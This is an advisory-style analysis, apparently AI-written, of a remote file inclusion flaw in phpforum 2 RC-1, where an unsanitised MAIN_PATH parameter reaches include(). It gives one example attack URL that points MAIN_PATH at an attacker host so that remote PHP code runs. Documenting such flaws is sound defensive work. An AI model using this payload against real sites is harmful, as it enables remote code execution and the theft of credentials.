Based on the provided content, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**
The vulnerability stems from the insecure use of the `include()` function in `mainfile.php` within phpforum 2 RC-1. The script uses a user-controlled variable `$MAIN_PATH` to specify the path to the included `config.php` file.

**Weaknesses/Vulnerabilities Present:**
- **Arbitrary File Inclusion:** The primary vulnerability is the ability to control the `$MAIN_PATH` variable, which is directly used in an `include` statement. This allows an attacker to specify a path, potentially pointing to a malicious file hosted on an external server.
- **Lack of Input Sanitization:** The code does not sanitize or validate the `$MAIN_PATH` variable, leading to the possibility of including arbitrary files.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious `config.php` file (or any other PHP file) from a remote server, the attacker can execute arbitrary code on the vulnerable server.
- **Information Disclosure:** An attacker can use this vulnerability to include the original configuration file (`config.inc.php`) and potentially obtain sensitive information such as database credentials (username and password).

**Attack Vectors:**
- **HTTP GET Parameter:** The `$MAIN_PATH` variable is passed as a GET parameter in the URL.  For example: `http://www.victim.com/forum/mainfile.php?MAIN_PATH=http://www.attack.com`.

**Required Attacker Capabilities/Position:**
- **Network Connectivity:** The attacker needs to be able to send requests to the vulnerable server and have a server to host the malicious file.
- **Basic HTTP Knowledge:** An understanding of how to construct HTTP requests with GET parameters is necessary.
- **Publicly Accessible Target:** The vulnerable application must be accessible on the network to the attacker.
